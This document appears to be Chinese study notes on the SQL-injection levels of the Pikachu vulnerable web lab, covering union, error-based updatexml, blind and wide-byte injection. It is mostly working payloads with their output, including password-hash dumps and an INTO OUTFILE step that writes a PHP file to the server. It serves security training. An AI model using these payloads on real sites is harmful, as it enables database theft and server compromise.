# pikachu-labs-SQL-injection 学习笔记

## 数字型注入（post）

1. ![014A3860](C:\Users\F1245363\AppData\Local\Temp\SGPicFaceTpBq\4560\014A3860.png)判断注入类型：

   ```sql
   发现是联合注入
   ```

2. 获取表中字段列数：

   ```sql
   id=1000 union (select 1,2)--+&submit=%E6%9F%A5%E8%AF%A2
   ```

   ```
   hello,1 <br />
   your email is: 2
   ```

3. 获取数据库名：

   ```sql
   id=1000 union (select 1, database())&submit=%E6%9F%A5%E8%AF%A2
   ```

   ```sql
   hello,1 <br />
   your email is: pikachu
   ```

4. 获取数据库表名：

   ```sql
   id=1000 union (select 1,group_concat(table_name) from information_schema.tables where table_schema = 'pikachu')&submit=%E6%9F%A5%E8%AF%A2
   ```

   ```sql
   hello,1 <br />
   your email is: httpinfo,member,message,users,xssblind
   ```

5. 获取指定表中的列名( 接下来我们想要攻破 users 这个表 )：

   ```sql
   id=1000 union (select 1,group_concat(column_name) from information_schema.columns where table_name = 'users')&submit=%E6%9F%A5%E8%AF%A2
   ```

   ```sql
   hello,1 <br />
   your email is: id,username,password,level,id,username,password
   ```

6. 获取 users 表所有的 username 及 password 数据：

   ```sql
   id=1000 union (select 1,group_concat(username,' : ',password) from users)&submit=%E6%9F%A5%E8%AF%A2
   ```

   ```
   hello,1 <br />
   your email is: admin : e10adc3949ba59abbe56e057f20f883e,pikachu : 670b14728ad9902aecba32e22fa4f6bd,test : e99a18c428cb38d5f260853678922e03
   ```

7. 读取文件：

   ```sql
   id=id=1000 union (select 1, load_file('D:/phpStudy/WWW/pikachu/vul/sqli/hack.php'))--+&submit=%E6%9F%A5%E8%AF%A2
   ```

   ```
   网页显示：hack.php文件内容
   ```

8. 植入木马程序：

   ```sql
   id=id=1000 union (select 1, "<?php echo php_uname();?>" into outfile 'D:/phpStudy/WWW/pikachu/vul/sqli/hack.php')--+&submit=%E6%9F%A5%E8%AF%A2
   ```

   ```
   访问木马程序：http://localhost/pikachu/vul/sqli/hack.php
   网页显示：1 Windows NT GL-20240817HAXG 6.2 build 9200 (Windows 8) i586
   ```

   

## 字符型注入（get）

1. 判断注入类型：

   ```
   发现是联合注入
   ```

2. 获取表中字段列数：

   ![013978A8](C:\Users\F1245363\AppData\Local\Temp\SGPicFaceTpBq\4560\013978A8.png)值得注意的是：如果使用 BurpSuite 来编辑 get 请求数据，记得将其中必须转换为 URL 编码的数据，提前转换成 URL 编码！！！当然，如果你使用浏览器插件 HackBar，则无需考虑这个问题！！！

   ```sql
   name=hack'+order+by+2--+&submit=%E6%9F%A5%E8%AF%A2 
   ```

   HackBar : 

   ```sql
   name=hack' order by 2--+&submit=%E6%9F%A5%E8%AF%A2
   ```

3. 爆数据、植入木马等操作同上述 "数字型注入"



## 搜索型注入

1. 判断注入类型：

   首先利用报错注入，即加入单引号，找出一些关键信息：

   ```sql
   http://localhost/pikachu/vul/sqli/sqli_search.php?name=hack'&submit=%E6%90%9C%E7%B4%A2
   ```

   ```
   页面显示：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
   ```

   有报错信息可知，进而可推断闭合符号为：`%'`，我们来进一步验证一下：

   ```sql
   http://localhost/pikachu/vul/sqli/sqli_search.php?name=hack%' or 1=1--+&submit=%E6%90%9C%E7%B4%A2
   ```

   ```
   username：vince
   uid:1
   email is: vince@pikachu.com
   
   username：allen
   uid:2
   email is: allen@pikachu.com
   
   ......
   ```

   发现我们的猜测是正确的！！！

2. 本关依旧可以利用**联合注入法**，爆数据、植入木马等操作同上述 "数字型注入"



## xx型注入

1. 判断注入类型：

   同**搜索型注入**，由报错注入法所得结果可知，闭合符号为 **`')`**：

   ```sql
   http://localhost/pikachu/vul/sqli/sqli_x.php?name=hack') or 1=1--+&submit=%E6%9F%A5%E8%AF%A2
   ```

   ```
   your uid:1
   your email is: vince@pikachu.com
   
   your uid:2
   your email is: allen@pikachu.com
   
   ......
   ```

2. 本关依旧可以利用**联合注入法**，爆数据、植入木马等操作同上述 "数字型注入"



## insert / update 注入

详细请参考：

* https://www.modb.pro/db/494321
* https://blog.51cto.com/u_11908275/6943535

```sql
# 其中 '--+ 的 URL 编码结果为： %27%2d%2d%2b，之所以这样做，是因为这关是 POST 请求，必须要提前进行 URL 编码！！！
username=hackname%27%2d%2d%2b&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
```

```
# 页面显示结果：
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'hackpwd'),'hacksex','hackphone','hackaddress01','hackaddress02')' at line 1
```

===> 闭合符号为 `'`，此处存在 sql 注入！又因为页面用户注册这个操作属于是 sql insert 中插入数据的操作，故不能使用联合注入，盲注，建议采用错误注入法，因为通过执行上述sql，我们发现页面的确会抛出 sql 错误：

1. 获取数据库名称：

   ```sql
   username=hackname' and updatexml(1,concat(0x7e,(database()),0x7e),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```
   网页页面显示：XPATH syntax error: '~pikachu~'
   ```

   注：payload `' and updatexml(1,concat(0x7e,(database()),0x7e),1) or '` 中之所以在尾部加入 `or '`，是为了闭合多余的单引号，举个例子吧：

   ```sql
   insert into member(username, password) value ('hack', 'hackpawd');
   ```

   ```sql
   insert into member(username, password) value ('hack' and updatexml(1,concat(0x7e,(database()),0x7e),1) or '', 'hackpawd');
   ```

2. 获取所有数据表名称：

   ```sql
   username=hackname' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```
   网页页面显示：XPATH syntax error: '~httpinfo,member,message,users,x'
   ```

   上述 payload 也可以是（不使用 `concat()` 函数）：

   ```sql
   username=hackname' and updatexml(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```
   网页页面显示：XPATH syntax error: ',member,message,users,xssblind'
   ```

   ![05EE5ED1](C:\Users\F1245363\AppData\Local\Temp\SGPicFaceTpBq\9656\05EE5ED1.png)emmm，你会发现这两个 payload 输出的信息都不完整！！！目前我看过很多博客笔记，大家都没解释过这个原因（**可能是因为显示长度限制无法显示出来**)！！！后面我们再谈这个问题，现在我们先去解决这个问题：利用 `substr()` 函数，也就是说这次我们从第 15 为开始显示，显示字符串的范围为 15 ~ 32.

   > 详情参考：https://www.modb.pro/db/494321
   >
   > 注：经过不断调整 substr 函数中的数字，发现能显示的最大数据长度为 31

   ```sql
   # [1 ~ 31]
   username=hackname' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```
   XPATH syntax error: '~httpinfo,member,message,users,x'
   ```

   ```sql
   # [32 ~ 32+31]
   username=hackname' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),32,31),0x7e),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```
   XPATH syntax error: '~ssblind~'
   ```

   ==> 综上所示，我们所有的表名为：

   ``` 
   httpinfo,member,message,users,xssblind
   ```

3. 获取 user 表的列名，即字段名：

   ```sql
   # [1, 31]
   username=hackname' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,31),0x7e),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```
   XPATH syntax error: '~id,username,password,level,id,u'
   ```

   ```sql
   # [32, 31]
   username=hackname' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),32,31),0x7e),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```\
   XPATH syntax error: '~sername,password~'
   ```

   ==> 综上所示，user 表中的所有字段名为：

   ```\\
   id,username,password,level
   ```

4. 获取 user 表中的所有数据：

   ```sql
   # [1, 31]
   username=hackname' and updatexml(1,concat(0x7e,substr((select group_concat(username, ' : ', password) from users),1,31),0x7e),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```
   XPATH syntax error: '~admin : e10adc3949ba59abbe56e05'
   ```

   ```sql
   # [32(1+31), 31]
   username=hackname' and updatexml(1,concat(0x7e,substr((select group_concat(username, ' : ', password) from users),32,31),0x7e),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```
   XPATH syntax error: '~7f20f883e,pikachu : 670b14728ad'
   ```

   ==> 综上所示，user 表中**第一行**的数据为：

   ```
   admin : e10adc3949ba59abbe56e05 + 7f20f883e
   ```

   紧接着我们获取 user 表中的第二行数据：

   ```sql
   # [63(32+31), 31]
   username=hackname' and updatexml(1,concat(0x7e,substr((select group_concat(username, ' : ', password) from users),63,31),0x7e),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```
   XPATH syntax error: '~9902aecba32e22fa4f6bd,test : e9'
   ```

   ==> 综上所述，user 表中第二行数据为：

   ```
   pikachu : 670b14728ad + 9902aecba32e22fa4f6bd
   ```

   我们继续，获取 user 表中的第三行数据：

   ```sql
   # [94(63+31), 31]
   username=hackname' and updatexml(1,concat(0x7e,substr((select group_concat(username, ' : ', password) from users),94,31),0x7e),1) or '&password=hackpwd&sex=hacksex&phonenum=hackphone&email=hackaddress01&add=hackaddress02&submit=submit
   ```

   ```
   XPATH syntax error: '~9a18c428cb38d5f260853678922e03~'
   ```

   ==> 综上所述，user 表中第三行数据为：

   ```
   test : e9 + 9a18c428cb38d5f260853678922e03
   ```

   ==> 综上：user 表中的数据为：

   ```
   admin : e10adc3949ba59abbe56e057f20f883e
   pikachu : 670b14728ad9902aecba32e22fa4f6bd
   test : e99a18c428cb38d5f260853678922e03
   ```



## delete 注入

1. 判断注入类型：通过查看源码可知，当 sql 影响的数据条数 != 1时，会向前端页面抛出提示："删除失败,检查下数据库是不是挂了"，但通过报错注入发现，页面可以回显 sql 错误信息，综上，故可使用报错注入法！

2. 获取数据库名称：

   ```sql
   http://localhost/pikachu/vul/sqli/sqli_del.php?id=631 or updatexml(1,concat(0x7e,(database()),0x7e),1)
   ```

   ```
   网页页面显示：XPATH syntax error: '~pikachu~'
   ```

3. 其余操作参考 **insert / update 注入**



## ❌ http head 注入

1. 判断注入类型：报错注入

   ```sql
   因为注入SQL为更新、删除类型，而非查询，故无法使用常规的联合注入法，
   又因为无数据回显，故也不建议用盲注法
   ```

2. 获取数据库名称：

   ```sql
   User-Agent: hackhuang' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '
   ```

   ```
   页面显示：XPATH syntax error: '~pikachu~'
   ```

   **注1：为什么上述注入 sql 是这种写法？**

   答：因为源码中的代码是这样的：

   ```sql
   $query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";
   ```

   所以为了闭合后面的符号 `'`，sql注入语句的后面使用了 `or '`：

   ```sql
   ('$is_login_id','$remoteipadd','hackhuang' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '','$httpaccept','$remoteport')
   ```

   **注2：解释 updatexml(1,concat(0x7e,(select database()),0x7e),1)**？

   ```sql
   这个SQL语句利用了UPDATEXML函数的一个特殊用法，通常被用在SQL注入攻击中，来提取数据库的信息。UPDATEXML是一个SQL函数，原意是用于更新XML类型的字段，但是由于其内部处理机制，它可以被滥用为提取数据的手段。
   
   UPDATEXML函数的语法是UPDATEXML(xml_document, xpath, new_value)。在上述语句中，UPDATEXML函数被用作：
   UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e), 1)
   
   这里的1作为xml_document和new_value参数，实际上并没有实际的XML文档被更新。CONCAT(0x7e, (SELECT DATABASE()), 0x7e)这部分用于构造一个XML格式的字符串，其中0x7e是十六进制表示的波浪线字符~。
   
   (SELECT DATABASE())部分执行一个查询，返回当前数据库的名称。整个CONCAT表达式将数据库名称包裹在两个波浪线~之间，形成如下格式的字符串：~database_name~。
   
   由于UPDATEXML函数需要返回一个XML文档，所以即使xml_document和new_value参数都是1，它仍然会尝试将CONCAT的结果转换为XML格式。这个转换过程会将字符串~database_name~以XML格式输出，通常会被查询语句的输出捕获。
   ```

3. 获取数据库表名称：

   ```sql
   User-Agent: hack' or updatexml(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1) or '
   ```

   ```sql
   网页显示：XPATH syntax error: ',member,message,users,xssblind'
   ```

   但问题来了，其实数据库表并没有显示完整，完整的数据库表名信息应为：`httpinfo,member,message,users,xssblind`，这很奇怪，排除函数 group_concat 返回值长度受限的情况，很大可能是因为 updatexml 函数返回值受限！！！至于怎么解决，还没想到好的方法，❌但目前可以通过下述 sql 注入语句来获取表名的前半段信息：

   ```sql
   User-Agent: hack' or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or '
   ```

   ```sql
   网页显示：XPATH syntax error: '~httpinfo,member,message,users,x'
   ```

   ==> 所以可得：所有数据表名信息为：`httpinfo, member, message, users, xssblind`

4. 获取表的列名信息：

   ```sql
   User-Agent: hack' or updatexml(1,(select group_concat(column_name) from information_schema.columns where table_name='users'),1) or '
   ```

   ```
   网页显示：XPATH syntax error: ',username,password,level,id,user'
   ```

   ```sql
   User-Agent: hack' or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,31),0x7e),1) or '
   ```

   ```sql
   网页显示：XPATH syntax error: '~id,username,password,level,id,u'
   ```

   ==> 所以可得：数据表列名信息为：`id, username, password, level, user`

   注：实际上通过检查后台数据库信息可得，真实的数据表列名信息为：`id, username, password, level`，so why ？？？

5. 获取数据信息：

   ```sql
   User-Agent: hack' or updatexml(1,(select group_concat(username,' : ', password) from users),1) or '
   ```

   ```
   XPATH syntax error: ',pikachu : 670b14728ad9902aecba3'
   ```

   ```sql
   User-Agent: hack' or updatexml(1,concat(0x7e,substr((select group_concat(username, ' : ', password) from users),1,31),0x7e),1) or '
   ```

   ```
   XPATH syntax error: '~admin : e10adc3949ba59abbe56e05'
   ```

   ==> **But，你会发现！这两条数据特么压根不是同一条！！！**

   > https://blog.csdn.net/elephantxiang/article/details/115771540 作者也写错了！！！！



## 盲注（base on boolian，即基于布尔的盲注）

尽管这关作者提示使用 and 盲注，但是作者并没有给出正确的提示信息，比如说给出一个 username，如果作者给出一个正确的 username，例如 username = 'lili'，那么我们可以使用 and 盲注：

一. 首先判断注入类型，通过错误注入法，闭合符合为单引号 `'`：

```sql
http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=lili'--+&submit=%E6%9F%A5%E8%AF%A2
```

二. 使用 and 盲注获取数据库名长度：

```sql
# 只有当 and 后面的 sql 语句也成立时，页面才是正常显示用户查询的信息：
# your uid:7
# your email is: lili@pikachu.com
# 否则输出：您输入的username不存在，请重新输入！
http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=lili' and length(database())=7--+&submit=%E6%9F%A5%E8%AF%A2
```

三. 使用 and 盲注获取数据库名称：

```sql
http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=lili' and ascii(substr(database(),1,1))=112--+&submit=%E6%9F%A5%E8%AF%A2
```

四. 使用 and 获取所有数据表名称：

```sql
http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=lili' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=104--+&submit=%E6%9F%A5%E8%AF%A2
```

五. 同理获取数据表中列名，再然后获取的表数据，这里不再多说

但目前情况是：我们不知道正确的 username，进而没办法使用 and 盲注，只能使用 or 盲注，**而本关 or 盲注没办法通过页面来判断注入是否成功，所以只能使用基于时间 or 盲注**：

一. 判断注入类型：

```sql
# 通过错误注入法 + 休眠函数，可得闭合符号为单引号
http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=xxx' or (select sleep(1))--+&submit=%E6%9F%A5%E8%AF%A2
```

二. 获取数据库名长度：

```sql
http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=xxx' or if(length(database())=7,sleep(1),null)--+&submit=%E6%9F%A5%E8%AF%A2
```

三. 获取数据库名：

```sql
http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=xxx' or if(ascii(substr(database(),1,1))=112,sleep(1),null)--+&submit=%E6%9F%A5%E8%AF%A2
```

四. 获取所有数据表名：

```sql
http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=xxx' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=104,sleep(1),null)--+&submit=%E6%9F%A5%E8%AF%A2
```

五. 同理获取数据表中列名，再然后获取的表数据，这里不再多说



## 盲注（base on time，即基于时间盲注）

同 "盲注（base on boolian）"中的基于时间的 or 盲注，这里不再多说



## ❌ 宽字节注入

预习知识：

* 宽字节注入的前提：PHP 发送请求到 mysql 时，对 sql 语句进行了一次编码，例如本关中对了 sql 语句进行了 gbk 编码
* 宽字节注入的原理：当转义使用的 `\` 为 **ASCII 编码**，而客户传入的参数被当成 **GBK 等宽字节编码**时，则可以通过在 `\` 之前插入一个十六进制（ASCII码要大于128，才到汉字的范围），来让 mysql 以为插入的字节和 `\` （的GBK编码组合）是一个中文字符，从而吃掉 `\`，摧毁其对单引号 `'`的转义

本关数据库使用了 GBK 编码，`\`将用于转义单引号`'`，而 `\`的 GBK 编码是 %5c，而 %df%5c 或 %af%5c 或 %ac%5c 的组合是一个汉字，故可以利用 %af 或 %bf 或 %cf 等吃掉 %5c，因此单引号就被逃逸了，进而可以闭合前面的单引号，成功形成注入 sql 语句！

https://www.modb.pro/db/494321

https://blog.csdn.net/elephantxiang/article/details/115771540

https://www.freebuf.com/articles/web/254079.html

https://blog.51cto.com/u_11908275/6943535

1. 判断注入类型：其为基于布尔的盲注，在详细点：其为基于 or 的盲注

   ```sql
   name=hack%af' or 1=1--+&submit=%E6%9F%A5%E8%AF%A2
   ```

   ```
   网页页面显示:
   your uid:1
   your email is:vince@pikachu.com
   
   your uid:2
   your email is:allen@pikachu.com
   
   ......
   ```

   也可以使用联合注入：

   ```
   name=hack%af' union select version(),database()--+&submit=%E6%9F%A5%E8%AF%A2
   ```

   ```
   网页页面显示:
   your uid:5.5.53
   your email is:pikachu
   ```

2. 其余操作同上，这里不再多说...



## 复习

好好复习下 where 语句后面的 or 和 and 语句...

```sql
select id,email from member where username='lili' and if(1=1,sleep(1),null);
```

```sql
 select id,email from member where username='lili' or if(1=1,sleep(3),null);
```

这样理解就可以啦：

一. ` select id,email from member` 可顺利执行的前提是：`username='lili'` 为 True，以及 ` if(1=1,sleep(3),null)` 为 True

```sql
 select id,email from member where 
 username='lili'
 and
 if(1=1,sleep(3),null);
```

二.  ` select id,email from member` 可顺利执行的前提是：`username='lili'` 为 True，或者 ` if(1=1,sleep(3),null)` 为 True

```sql
 select id,email from member where 
 username='lili'
 or
 if(1=1,sleep(3),null);
```